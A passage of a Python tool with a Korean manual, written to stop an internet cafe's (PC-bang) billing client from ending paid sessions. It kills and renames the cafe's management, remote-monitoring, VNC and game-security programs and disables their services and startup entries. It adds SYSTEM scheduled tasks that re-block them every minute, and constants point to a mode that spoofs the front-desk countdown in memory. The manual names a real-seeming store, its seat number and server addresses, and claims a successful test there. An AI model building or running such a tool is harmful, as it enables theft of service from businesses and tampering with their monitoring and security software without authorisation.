import ctypes
import ctypes.wintypes as wt
import json
import os
import re
import shutil
import struct
import subprocess
import sys
import time
import winreg

DOC = r"""
============================================================
 피시방.py  -  PC방 PC 무제한 (시간 만료로 꺼지지 않게)
============================================================

사용법
  피시방.py run            이 PC에 전부 적용 (원격 감시 포함 영구 정지)
  피시방.py scan           자동 탐지만 (변경 없음, 다른 PC방에서 먼저 확인용)
  피시방.py spoof-live     카운터 5시간 카운트다운 스푸핑 (포그라운드 루프)
  피시방.py status         현재 상태 표시
  피시방.py verify         6개 항목 자동 검증
  피시방.py restore        백업 시점으로 원상 복구
  피시방.py install-boot   D: 에 설치 + 로그온 자동 실행 등록 (재부팅 대비)
  피시방.py remove-boot    로그온 자동 실행 해제
  피시방.py 설명           이 문서 출력

------------------------------------------------------------
1. 목표
------------------------------------------------------------
이 PC(및 같은 방식의 다른 PC방 PC)가 시간 차감이 끝나도
꺼지지 않고, 관리 프로그램이 되살아나지 않게 만든다.

  1) 시간이 다 되어도 꺼지지 않는다
     -> 이번 부팅 중 종료/재시작/로그오프 이벤트 0건, uptime 유지
  2) 프로그램이 다시 켜지지 않는다
     -> 서비스/작업/Run/시작폴더/실행파일 5경로 전부 차단
  3) 원격 감시·원격 제어가 꺼진다
     -> 모니터링 클라이언트·게임 보안·VNC 프로세스/서비스 0
  4) 윈도우 자체도 안 꺼진다
     -> 절전/최대절전/모니터/디스크 타임아웃 AC 전부 0
  5) 한 번 실행으로 재현된다
     -> '피시방.py run' 1회 -> 결과 PASS
  6) 원상 복구 가능
     -> '피시방.py restore'

------------------------------------------------------------
2. 원리
------------------------------------------------------------
[핵심] 요금 서버가 아니라 로컬 실행자를 없앤다.

PC방 요금은 서버가 계산하지만, PC를 실제로 끄는 것은
서버가 아니라 PC에서 도는 클라이언트 프로그램이다.
서버는 "시간 끝났다"는 명령만 내리고, 그 명령을 받아
ExitWindowsEx() (강제 종료 API)를 호출하는 것은 로컬 프로세스다.

   [요금 서버] --"시간 종료" 명령--> [PC방 클라이언트] --ExitWindowsEx()--> PC 꺼짐
                (TCP 15950)            (로컬 프로세스)

따라서 클라이언트가 없으면 서버가 무슨 명령을 내려도
실행될 주체가 없다. 서버를 해킹하거나 시간을 조작하는 방식이
아니라, 종료 명령의 실행 경로를 끊는 방식이다.

[이 매장의 실제 구성]  (2026-10-24 확인)
  매장          : 맥스피드PC방 태릉입구역 (mcname)
  관리 프로그램 : 게토 계열 Mobilnet Wm
                  C:\Program Files (x86)\Mobilnet\Wm
  좌석          : 025 (MACNNO=25)
  요금 서버     : 118.130.39.130:15950
  매장 모니터링 : ENTER-PATCH 118.130.39.250:18790 (PcCafeMonitorClient)
  디스크리스    : VirtualTOP / NetZone NxDDisk 118.130.39.251, .252

[종료를 실제로 실행하는 바이너리]  (문자열 분석으로 확인)
  C:\Windows\SysWOW64\wmcltsvc.exe   ExitWindowsEx O, SeShutdownPrivilege O
                                     -> 핵심 실행자 + 부활 감시자
  ScreenLoginLock.exe                ExitWindowsEx O  -> 시간 종료 후 잠금 화면
  RTAgent.exe                        ExitWindowsEx O  -> 원격 명령 처리
  we.exe                             ExitWindowsEx O  -> 보조 실행자
  WmClt.exe                          ExitWindowsEx X  -> 위 실행자에게 지시만

[왜 "그냥 끄기"는 안 통하는가 - 부활 경로 4개]
WmClt.exe만 죽이면 1초 안에 되살아난다. 실측:
  18:52:29 kill -> 18:52:30 새 PID로 부활 (부모: wmcltsvc.exe)

  1) 서비스      WMCLTSVC -> wmcltsvc.exe -WMCLTSVC
                 Auto/Delayed. 죽으면 즉시 재실행 (감시자)
  2) 작업 스케줄러 \WMCLTS -> wmclt.exe
                 1분마다 실행, 23시간 59분 지속
  3) Run 키      HKLM\...\WOW6432Node\...\Run\WMCLT -> wmcltlc.exe
                 로그온 시
  4) 시작 폴더   %APPDATA%\...\Startup\WmClt.lnk
                 로그온 시 (클라이언트가 스스로 재생성)

추가로 D:\vtoputil\GETO_SCH.bat 가 ONLOGON 작업 GETO(SYSTEM)를
만드는 경로도 존재한다.

-> 그래서 kill이 아니라
   "영구 비활성 + 실행파일 이름 변경 + 1분 감시" 3중으로 막는다.

[왜 이 매장에서 통하는가]
  - 시간 표시·차감·종료가 전부 로컬 클라이언트에서 일어난다.
  - 클라이언트가 죽으면 요금 서버 연결(15950)이 끊겨 차감이 멈춘다.
  - 디스크리스(노하드)지만 C: 는 초기화되지 않는다.
    근거: 시스템 이벤트 로그가 2026-05-26부터 연속 존재,
          5/26 이전 생성 파일 6,058개 잔존,
          6/12 부팅 때 생성된 파일 539개 잔존.
    -> 레지스트리·서비스 설정 변경이 재부팅 후에도 유지된다.

------------------------------------------------------------
3. 방법
------------------------------------------------------------
[실행]  관리자 권한이 없으면 스스로 UAC 승격한다.
  피시방.py run

[run 이 하는 일 - 순서]
  1) 백업 -> C:\ProgramData\PCBangFree\backup\<타임스탬프>\
  2) 종료 실행자 정지 (시간관리 + 감시/원격 계열 전부 kill)
  3) 부활 경로 차단
     - 서비스 WMCLTSVC, GreenGuardInvokeSVC, tvnserver,
       NZWinVNC4, Interezen_service -> Disabled + 정지
     - 작업 WMCLTS, GETO -> Disabled
     - Run 값 WMCLT, GreenGuard, Gips.exe, ipinside-lws,
       PcCafeMonitorClient -> 삭제
     - 시작폴더 WmClt.lnk -> WmClt.lnk.off
     - 실행파일 이름 변경(.off):
       WmClt.exe, wmcltsvc.exe, ScreenLoginLock.exe,
       GreenGuard.exe, PcCafeMonitorClient.exe
  4) 윈도우 자동 꺼짐 차단
     - 절전/최대절전/모니터/디스크 AC 타임아웃 0, 화면보호기 off
  5) 부활 감시 작업 등록
     - PCBangFreeGuard (SYSTEM, 로그온 + 1분 주기)
     - 무엇이 되살아나도 1분 내 재차단
  6) 검증 (6개 항목 자동 판정)

[검증 결과 - 2026-10-24 실측]
  만료 시점 산정: 18:46 UserInfo 창 제목 "남은시간 00:24"
                  -> 만료 19:10
  만료 후 경과           36분 이상
  종료/재시작 이벤트     0건
  로그오프 이벤트        0건
  uptime                 18:29:22 그대로 유지
  대상 프로세스          0개
  최종 판정              PASS

[재부팅 후에도 유지하려면]
  이 매장은 C: 가 초기화되지 않으므로 run 한 번이면 재부팅 후에도 유지된다.
  C: 가 매 부팅 초기화되는 진짜 노하드 매장이면 아래를 실행한다.
    피시방.py install-boot
  -> D:\피시방\피시방.py 로 복사하고,
     D:\Util\추가_실행\피시방.vbs 를 만들어
     로그온 때마다 자동으로 run 을 다시 실행한다.
     (D:\Util\Enter\Enter.bat 가 추가_실행 폴더를 자동 실행하는 구조를 이용)

[다른 PC방에서 쓸 때 - 자동 탐지]
  run 을 실행하면 자동으로 대상을 찾는다. 업체 이름을 몰라도 된다.

  1) 실행 중인 모든 프로세스의 실행파일에서 종료 API 문자열을 검사
     ExitWindowsEx / InitiateSystemShutdown / InitiateShutdown
  2) 그 프로세스 이름을 참조하는 자동시작 경로를 역추적
     - 서비스 ImagePath
     - 작업 스케줄러 XML (<Command>)
     - HKLM/HKCU Run, RunOnce
     - 시작프로그램 .lnk
  3) 찾은 것을 전부 비활성 + 실행파일 이름 변경 + 1분 감시

  제외 목록 (건드리면 안 되는 것)
    - 디스크리스 부팅 클라이언트: nxprun, nxpauxsvc, nxddsk, VirtualTOP, NetZone
    - 윈도우 기본: shutdown.exe, winlogon, services, lsass, svchost, explorer,
      csrss, wininit, smss, conhost, powershell, cmd, reg, sc, taskkill, py/python
    - 자기 자신: C:\ProgramData\PCBangFree

  확정된 대상은 C:\ProgramData\PCBangFree\targets.json 에 저장되고,
  1분 감시(guard)와 verify 가 그 목록을 그대로 사용한다.

  먼저 확인만 하려면 (아무것도 바꾸지 않음)
    피시방.py scan

[다른 PC방에서 안 통할 수 있는 경우]
  - 종료를 로컬 프로그램이 아니라 하드웨어로 처리하는 매장
    (좌석 전원 차단 릴레이, 서버측 네트워크 차단, BIOS 예약 종료)
  - 종료 API를 쓰지 않고 커널 드라이버/서비스에서 강제 로그오프하는 매장
  - 관리 프로그램이 이미지에 내장되어 재부팅마다 되살아나는 매장
    -> 이 경우 install-boot 로 로그온마다 재적용해야 한다
  - 매장이 커스텀 프로토콜로 잠금화면만 띄우는 경우
    -> 화면은 잠겨도 프로세스는 살아있으므로 scan 결과를 보고 판단

[주의]
  - 요금을 0으로 만드는 게 아니다. 차감을 멈추고 종료를 막는 것이다.
    카운터 화면에 이 좌석이 어떻게 보이는지는 원격에서 확인 불가.
  - 매장이 이미지를 재배포/재설치하면 되돌아간다.
    그때는 다시 run 한 번.
  - 그린가드(게임 보안)와 VNC(원격 지원)가 꺼진다.
    일부 게임의 PC방 인증·혜택이 안 될 수 있고 원격 지원도 못 받는다.
  - 디스크리스 부팅 클라이언트(nxprun.exe, nxpauxsvc.exe)는 건드리지 않는다.
  - 백업은 C:\ProgramData\PCBangFree\backup\ 에 남는다.
    지우면 restore 불가.
"""

ROOT = r"C:\ProgramData\PCBangFree"
BACKUP_ROOT = os.path.join(ROOT, "backup")
GUARD_DIR = ROOT
GUARD_CMD = os.path.join(GUARD_DIR, "guard.cmd")
GUARD_TASK = "PCBangFreeGuard"
GUARD_TASK_LOGON = "PCBangFreeGuardLogon"
GUARD_TASK_BOOT = "PCBangFreeGuardBoot"
BOOT_DIR = r"D:\피시방"
BOOT_SCRIPT = os.path.join(BOOT_DIR, "피시방.py")
HOOK_DIR = r"D:\Util\추가_실행"
HOOK_VBS = os.path.join(HOOK_DIR, "피시방.vbs")
SCRIPT = os.path.abspath(__file__)

PROCESS = [
    "WmClt.exe", "WmCltSvc.exe", "WmCltLC.exe", "UserInfo.exe",
    "GameHub.exe", "PromotionHub.exe", "ScreenLoginLock.exe", "RTAgent.exe",
    "we.exe", "MSUPRD.exe", "AddLnch.exe", "gcrawl.exe",
    "PcCafeMonitorClient.exe", "Client_Monitor.exe",
    "GreenGuard.exe", "GGCInvoker.exe", "invokerAgt.exe",
    "tvnserver.exe", "I3GProc.exe", "pcbAgentV3.exe", "Gips.exe",
    "WCCustomer.exe", "WCCST.exe", "WCCST_D.exe",
    "wcwatch.exe", "WCGuard.exe", "chost.exe",
    "DAK.GG.exe",
    "KHardClientService.exe", "PFGameDisk.exe", "PFDesktopClient.exe", "PFGameSyncMgr.exe",
    "dark.gg", "darkgg.exe", "DarkGG.exe",
]

DARK_NAMES = ["dark.gg", "darkgg", "dark gg"]

SERVICES = ["WMCLTSVC", "GreenGuardInvokeSVC", "tvnserver", "NZWinVNC4", "Interezen_service",
            "wcwatch", "WCGuard", "chost", "KHardClientService"]
TASKS = ["WMCLTS", "GETO", "CheckWC", "StartAgent"]

RUN_VALUES = [
    ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "WMCLT"),
    ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "GreenGuard"),
    ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "Gips.exe"),
    ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "ipinside-lws"),
    ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PcCafeMonitorClient"),
    ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WCCustomer"),
    ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WCGuard"),
    ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "electron.app.DAK.GG"),
]

EXE_HIDE = [
    r"C:\Program Files (x86)\Mobilnet\Wm\WmClt\WmClt.exe",
    r"C:\Windows\SysWOW64\wmcltsvc.exe",
    r"C:\Program Files (x86)\Mobilnet\Wm\WmClt\ScreenLoginLock.exe",
    r"C:\Program Files\GreenGuard\GreenGuard.exe",
    r"D:\Util\PcCafeMonitorClient\PcCafeMonitorClient.exe",
    r"C:\Users\Administrator\AppData\Local\Programs\world-class-user\WCCustomer.exe",
    r"C:\Users\Administrator\AppData\Local\Programs\world-class-user\resources\extraResources\WCCST.exe",
    r"C:\Users\Administrator\AppData\Local\Programs\world-class-user\resources\extraResources\WCCST_D.exe",
    r"C:\Program Files\WCCustomer\WCCustomer.exe",
    r"C:\Program Files\WCCustomer\resources\extraResources\WCCST.exe",
    r"C:\Program Files\WCCustomer\resources\extraResources\wcwatch.exe",
    r"C:\Program Files\WCCustomer\resources\extraResources\chost.exe",
    r"C:\Program Files\wcwatch\wcwatch.exe",
    r"C:\Program Files\WCGuard\WCGuard.exe",
    r"C:\Program Files\chost\chost.exe",
    r"C:\Users\Administrator\AppData\Local\Programs\DAK.GG\DAK.GG.exe",
    r"C:\PFGameDisk\KHardClientService.exe",
    r"C:\PFGameDisk\PFGameDisk.exe",
    r"H:\GamePot_Client\PFDesktopClient.exe",
    r"H:\PFGameSync_Client\PFGameSyncMgr.exe",
]

STARTUP_LNK = os.path.join(
    os.environ.get("APPDATA", ""),
    r"Microsoft\Windows\Start Menu\Programs\Startup\WmClt.lnk",
)

POWER_SETTINGS = [
    ("SUB_SLEEP", "STANDBYIDLE"),
    ("SUB_SLEEP", "HIBERNATEIDLE"),
    ("SUB_VIDEO", "VIDEOIDLE"),
    ("SUB_DISK", "DISKIDLE"),
]

HIVES = {"HKLM": winreg.HKEY_LOCAL_MACHINE, "HKCU": winreg.HKEY_CURRENT_USER}

TARGETS_FILE = os.path.join(ROOT, "targets.json")

SPOOF_HOURS = 5
SPOOF_ADDRS = [0x3A2CDC4, 0x3A2CE84, 0x3A2CF44, 0x3A2D004, 0x3A2D3C4]

_SHUT_RX = re.compile(rb"ExitWindowsEx|InitiateSystemShutdown|InitiateShutdown")
_MEMO = {}
_RXCACHE = {}

EXCLUDE_NAMES = {
    "system", "idle", "registry", "smss.exe", "csrss.exe", "wininit.exe",
    "services.exe", "lsass.exe", "winlogon.exe", "explorer.exe", "svchost.exe",
    "shutdown.exe", "taskkill.exe", "tasklist.exe", "schtasks.exe", "sc.exe",
    "reg.exe", "powercfg.exe", "cmd.exe", "powershell.exe", "pwsh.exe",
    "python.exe", "pythonw.exe", "py.exe", "pyw.exe", "conhost.exe",
    "nxprun.exe", "nxpauxsvc.exe", "nxddsk.exe",
}

EXCLUDE_PATH_PARTS = (
    "\\pcbangfree\\",
    "\\virtualtop",
    "\\netzone",
    "\\driverstore\\",
    "\\nxddsk",
)

RUN_KEYS = [
    ("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
    ("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
    ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
    ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce"),
    ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
    ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
]

TASK_DIR = r"C:\Windows\System32\Tasks"

STARTUP_DIRS = [
    os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
    r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
]

_TARGETS = None


def ok(msg):
    print(f"  [O] {msg}")


def warn(msg):
    print(f"  [!] {msg}")


def step(msg):
    print(f"  [*] {msg}")


def run(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True,
                           encoding="cp949", errors="replace", timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except Exception as exc:
        return 1, str(exc)


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def elevate():
    params = subprocess.list2cmdline([SCRIPT] + sys.argv[1:])
    print("관리자 권한으로 다시 실행합니다...")
    rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
    sys.exit(0 if rc > 32 else 1)


def reg_get(hive, path, name):
    try:
        with winreg.OpenKey(HIVES[hive], path, 0, winreg.KEY_READ) as key:
            return winreg.QueryValueEx(key, name)[0]
    except OSError:
        return None


def reg_del(hive, path, name):
    try:
        with winreg.OpenKey(HIVES[hive], path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, name)
        return True
    except OSError:
        return False


def reg_set(hive, path, name, value):
    with winreg.CreateKeyEx(HIVES[hive], path, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)


_SVC_MODE_CACHE = {}
def service_mode(name):
    if name in _SVC_MODE_CACHE:
        return _SVC_MODE_CACHE[name]
    rc, out = run(["sc.exe", "qc", name])
    if rc != 0:
        _SVC_MODE_CACHE[name] = None
        return None
    if "4   DISABLED" in out:
        res = "Disabled"
    elif "2   AUTO_START" in out:
        res = "Auto"
    elif "3   DEMAND_START" in out:
        res = "Manual"
    else:
        res = "Unknown"
    _SVC_MODE_CACHE[name] = res
    return res


def service_state(name):
    rc, out = run(["sc.exe", "query", name])
    if rc != 0:
        return None
    if "RUNNING" in out:
        return "Running"
    return "Stopped"


def task_state(name):
    rc, out = run(["schtasks.exe", "/query", "/tn", name, "/fo", "list"])
    if rc != 0:
        return None
    for line in out.splitlines():
        if "Status" in line or "상태" in line:
            return line.split(":", 1)[-1].strip()
    return "Unknown"


def list_pids():
    arr = (wt.DWORD * 8192)()
    needed = wt.DWORD()
    if not ctypes.windll.psapi.EnumProcesses(arr, ctypes.sizeof(arr), ctypes.byref(needed)):
        return []
    return [arr[i] for i in range(needed.value // 4)]


def proc_path(pid):
    handle = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
    if not handle:
        return None
    try:
        buf = ctypes.create_unicode_buffer(32768)
        size = wt.DWORD(32768)
        if ctypes.windll.kernel32.QueryFullProcessImageNameW(handle, 0, buf, ctypes.byref(size)):
            return buf.value
        return None
    finally:
        ctypes.windll.kernel32.CloseHandle(handle)


def has_shutdown_api(path):
    key = ("api", path.lower())
    hit = _MEMO.get(key)
    if hit is None:
        hit = False
        try:
            if os.path.getsize(path) <= 80 * 1024 * 1024:
                with open(path, "rb") as fh:
                    hit = _SHUT_RX.search(fh.read(2 * 1024 * 1024)) is not None
        except OSError:
            pass
        _MEMO[key] = hit
    return hit


def file_company(path):
    if not path:
        return ""
    key = ("co", path.lower())
    if key in _MEMO:
        return _MEMO[key]
    company = ""
    try:
        size = ctypes.windll.version.GetFileVersionInfoSizeW(path, None)
        if size:
            buf = ctypes.create_string_buffer(size)
            if ctypes.windll.version.GetFileVersionInfoW(path, 0, size, buf):
                ptr = ctypes.c_void_p()
                length = wt.UINT()
                if ctypes.windll.version.VerQueryValueW(buf, "\\VarFileInfo\\Translation",
                                                        ctypes.byref(ptr), ctypes.byref(length)):
                    lang, codepage = ctypes.cast(ptr, ctypes.POINTER(wt.WORD * 2)).contents
                    query = f"\\StringFileInfo\\{lang:04x}{codepage:04x}\\CompanyName"
                    if ctypes.windll.version.VerQueryValueW(buf, query, ctypes.byref(ptr), ctypes.byref(length)):
                        company = ctypes.wstring_at(ptr.value, length.value).rstrip("\x00").strip()
    except Exception:
        pass
    _MEMO[key] = company
    return company


def is_excluded(name, path):
    if name.lower() in EXCLUDE_NAMES:
        return True
    low = (path or "").lower()
    if any(part in low for part in EXCLUDE_PATH_PARTS):
        return True
    if low.startswith("c:\\windows\\system32\\"):
        return True
    company = file_company(path).lower()
    if "microsoft" in company:
        return True
    return False


def running_shutdown_agents():
    found = {}
    for pid in list_pids():
        path = proc_path(pid)
        if not path:
            continue
        name = os.path.basename(path)
        if name.lower() in EXCLUDE_NAMES:
            continue
        low_name = name.lower()
        dark_hit = any(d in low_name for d in ("darkgg", "dark.gg", "dark gg"))
        if not dark_hit and not has_shutdown_api(path):
            continue
        if is_excluded(name, path) and not dark_hit:
            continue
        found[path.lower()] = {"name": name, "path": path, "pid": pid}
    return list(found.values())


def _contains_name(name, text):
    rx = _RXCACHE.get(name)
    if rx is None:
        rx = re.compile(r"(?<![A-Za-z0-9])" + re.escape(str(name).lower()) + r"(?![A-Za-z0-9])")
        _RXCACHE[name] = rx
    return rx.search(str(text).lower()) is not None


def services_referencing(names):
    hits = []
    base = r"SYSTEM\CurrentControlSet\Services"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base) as root:
            index = 0
            while True:
                try:
                    svc = winreg.EnumKey(root, index)
                except OSError:
                    break
                index += 1
                try:
                    with winreg.OpenKey(root, svc) as key:
                        image, _ = winreg.QueryValueEx(key, "ImagePath")
                except OSError:
                    continue
                low = str(image).lower()
                for name in names:
                    if _contains_name(name, low):
                        hits.append({"service": svc, "image": str(image)})
                        break
    except OSError:
        pass
    return hits


def image_to_path(image):
    text = str(image).strip()
    if text.startswith('"'):
        end = text.find('"', 1)
        text = text[1:end] if end > 0 else text.strip('"')
    elif " " in text and not os.path.exists(text):
        text = text.split(" ")[0]
    text = os.path.expandvars(text)
    if text and not os.path.isabs(text):
        text = os.path.join(r"C:\Windows", text)
    return text


def installed_service_agents():
    found = {}
    base = r"SYSTEM\CurrentControlSet\Services"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base) as root:
            index = 0
            while True:
                try:
                    svc = winreg.EnumKey(root, index)
                except OSError:
                    break
                index += 1
                try:
                    with winreg.OpenKey(root, svc) as key:
                        image, _ = winreg.QueryValueEx(key, "ImagePath")
                except OSError:
                    continue
                path = image_to_path(image)
                if not path or not os.path.isfile(path):
                    continue
                name = os.path.basename(path)
                dark_hit = any(d in (name + " " + str(image)).lower()
                               for d in ("darkgg", "dark.gg", "dark gg"))
                if not dark_hit and not has_shutdown_api(path):
                    continue
                if is_excluded(name, path) and not dark_hit:
                    continue
                found[path.lower()] = {"name": name, "path": path, "service": svc}
    except OSError:
        pass
    return list(found.values())


def tasks_referencing(names):
    hits = []
    if not os.path.isdir(TASK_DIR):
        return hits
    for root, _dirs, files in os.walk(TASK_DIR):
        for fname in files:
            path = os.path.join(root, fname)
            try:
                with open(path, "rb") as fh:
                    raw = fh.read()
            except OSError:
                continue
            text = ""
            for enc in ("utf-16-le", "utf-8", "mbcs"):
                try:
                    cand = raw.decode(enc, errors="ignore")
                except LookupError:
                    continue
                if "<Task" in cand or "<Command" in cand:
                    text = cand
                    break
            if not text:
                continue
            low = text.lower()
            for name in names:
                if _contains_name(name, low):
                    rel = os.path.relpath(path, TASK_DIR)
                    hits.append({"task": rel, "file": path})
                    break
    return hits


def run_values_referencing(names):
    hits = []
    for hive, regpath in RUN_KEYS:
        try:
            with winreg.OpenKey(HIVES[hive], regpath) as key:
                index = 0
                while True:
                    try:
                        vname, vdata, _ = winreg.EnumValue(key, index)
                    except OSError:
                        break
                    index += 1
                    low = str(vdata).lower()
                    for name in names:
                        if _contains_name(name, low):
                            hits.append({"hive": hive, "path": regpath,
                                         "name": vname, "value": str(vdata)})
                            break
        except OSError:
            continue
    return hits


def startup_referencing(names):
    hits = []
    for folder in STARTUP_DIRS:
        if not os.path.isdir(folder):
            continue
        for fname in os.listdir(folder):
            if not fname.lower().endswith(".lnk"):
                continue
            path = os.path.join(folder, fname)
            try:
                with open(path, "rb") as fh:
                    raw = fh.read()
            except OSError:
                continue
            low = raw.lower()
            for name in names:
                if name.lower().encode("ascii", "ignore") in low or \
                        name.lower().encode("utf-16-le") in low:
                    hits.append({"lnk": path})
                    break
    return hits


def base_targets():
    return {
        "process": list(PROCESS),
        "services": list(SERVICES),
        "tasks": list(TASKS),
        "run": [[h, p, n] for h, p, n in RUN_VALUES],
        "exe": list(EXE_HIDE),
        "startup": [STARTUP_LNK],
        "discovered": False,
    }


def discover_targets(verbose=True):
    running = running_shutdown_agents()
    installed = installed_service_agents()
    by_path = {}
    for agent in running + installed:
        by_path.setdefault(agent["path"].lower(), agent)
    agents = list(by_path.values())
    usable = [a for a in agents if not is_excluded(a["name"], a["path"])]
    names = sorted({a["name"] for a in usable})
    for d in DARK_NAMES:
        if d not in names:
            names.append(d)
    names = sorted(set(names))
    extra_paths = [a["path"] for a in usable]

    if verbose:
        print()
        print("  -- 자동 탐지 --")
        if not agents:
            print("     종료 API를 쓰는 프로그램: 없음")
        for agent in agents:
            src = "실행중" if any(a["path"].lower() == agent["path"].lower() for a in running) else "설치됨"
            if is_excluded(agent["name"], agent["path"]):
                src = "제외"
            print(f"     [{src}] {agent['name']:<24} {agent['path']}")
        if not names:
            return {"process": [], "services": [], "tasks": [], "run": [],
                    "exe": [], "startup": []}

    services = [h["service"] for h in services_referencing(names)]
    tasks = [h["task"] for h in tasks_referencing(names)]
    run_values = [[h["hive"], h["path"], h["name"]] for h in run_values_referencing(names)]
    startup = [h["lnk"] for h in startup_referencing(names)]

    if verbose:
        print("     서비스   : " + (", ".join(services) if services else "없음"))
        print("     작업     : " + (", ".join(tasks) if tasks else "없음"))
        print("     Run 값   : " + (", ".join(r[2] for r in run_values) if run_values else "없음"))
        print("     시작폴더 : " + (", ".join(os.path.basename(s) for s in startup) if startup else "없음"))

    return {
        "process": names,
        "services": services,
        "tasks": tasks,
        "run": run_values,
        "exe": extra_paths,
        "startup": startup,
    }


def merge_targets(base, extra):
    merged = {
        "process": sorted(set(base["process"]) | set(extra.get("process", []))),
        "services": sorted(set(base["services"]) | set(extra.get("services", []))),
        "tasks": sorted(set(base["tasks"]) | set(extra.get("tasks", []))),
        "run": [],
        "exe": sorted(set(base["exe"]) | set(extra.get("exe", []))),
        "startup": sorted(set(base["startup"]) | set(extra.get("startup", []))),
        "discovered": True,
    }
    seen = set()
    for item in base["run"] + extra.get("run", []):
        key = (item[0], item[1], item[2])
        if key in seen:
            continue
        seen.add(key)
        merged["run"].append(list(item))
    return merged


def save_targets(targets):
    try:
        os.makedirs(ROOT, exist_ok=True)
        with open(TARGETS_FILE, "w", encoding="utf-8") as fh:
            json.dump(targets, fh, ensure_ascii=False, indent=2)
    except OSError:
        pass


def load_targets():
    try:
        with open(TARGETS_FILE, encoding="utf-8") as fh:
            data = json.load(fh)
        data["run"] = [list(x) for x in data.get("run", [])]
        return data
    except (OSError, ValueError):
        return None


def targets():
    global _TARGETS
    if _TARGETS is None:
        saved = load_targets()
        _TARGETS = saved if saved else base_targets()
    return _TARGETS


_TASKLIST_CACHE = {"v": None}
def tasklist_names():
    if _TASKLIST_CACHE["v"] is not None:
        return _TASKLIST_CACHE["v"]
    rc, out = run(["tasklist.exe", "/FO", "CSV", "/NH"])
    if rc != 0:
        _TASKLIST_CACHE["v"] = None
        return None
    names = set()
    for line in out.splitlines():
        if line.startswith('"'):
            names.add(line.split('"')[1].lower())
    _TASKLIST_CACHE["v"] = names
    return names


def kill_targets():
    t = targets()["process"]
    before = tasklist_names()
    cmd = ["taskkill.exe", "/F"]
    for n in t:
        cmd += ["/IM", n]
    run(cmd)
    after = tasklist_names()
    if before is None or after is None:
        return []
    return [n[:-4] if n.lower().endswith(".exe") else n
            for n in t if n.lower() in before and n.lower() not in after]


def backup_dir():
    os.makedirs(BACKUP_ROOT, exist_ok=True)
    path = os.path.join(BACKUP_ROOT, time.strftime("%Y%m%d-%H%M%S"))
    os.makedirs(path, exist_ok=True)
    return path


def make_backup():
    path = backup_dir()
    manifest = {
        "created": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "host": os.environ.get("COMPUTERNAME", ""),
        "services": [],
        "tasks": [],
        "run": [],
        "files": [],
        "power": {},
    }
    t = targets()
    manifest["targets"] = t
    for name in t["services"]:
        mode = service_mode(name)
        if mode:
            manifest["services"].append({"name": name, "mode": mode})
            run(["reg.exe", "export", r"HKLM\SYSTEM\CurrentControlSet\Services" + "\\" + name,
                 os.path.join(path, f"svc_{name}.reg"), "/y"])
    for name in t["tasks"]:
        state = task_state(name)
        if state:
            manifest["tasks"].append({"name": name, "state": state})
            rc, out = run(["schtasks.exe", "/query", "/tn", name, "/xml"], timeout=60)
            if rc == 0:
                safe = name.replace("\\", "_")
                with open(os.path.join(path, f"task_{safe}.xml"), "w", encoding="utf-16") as fh:
                    fh.write(out)
    for hive, regpath, name in t["run"]:
        value = reg_get(hive, regpath, name)
        if value is not None:
            manifest["run"].append({"hive": hive, "path": regpath, "name": name, "value": value})
    for exe in t["exe"]:
        if os.path.exists(exe):
            manifest["files"].append({"path": exe, "renamed": exe + ".off"})
    for lnk in t["startup"]:
        if lnk and os.path.exists(lnk):
            manifest["files"].append({"path": lnk, "renamed": lnk + ".off"})
    for group, setting in POWER_SETTINGS:
        rc, out = run(["powercfg.exe", "/query", "SCHEME_CURRENT", group, setting])
        values = [v for v in out.replace("\n", " ").split() if v.lower().startswith("0x")]
        if values:
            manifest["power"][f"{group}/{setting}"] = values[0]
    with open(os.path.join(path, "manifest.json"), "w", encoding="utf-8") as fh:
        json.dump(manifest, fh, ensure_ascii=False, indent=2)
    return path


def disable_proxy():
    run(["reg.exe", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
         "/v", "ProxyEnable", "/t", "REG_DWORD", "/d", "0", "/f"])
    run(["reg.exe", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
         "/v", "ProxyServer", "/f"])
    run(["reg.exe", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
         "/v", "AutoConfigURL", "/f"])
    run(["netsh.exe", "winhttp", "reset", "proxy"])
    try:
        ctypes.windll.wininet.InternetSetOptionW(None, 39, None, 0)
        ctypes.windll.wininet.InternetSetOptionW(None, 37, None, 0)
    except Exception:
        pass


def disable_persistence():
    t = targets()
    for name in t["services"]:
        run(["sc.exe", "stop", name])
        run(["sc.exe", "config", name, "start=", "disabled"])
    for name in t["tasks"]:
        run(["schtasks.exe", "/Change", "/TN", name, "/DISABLE"])
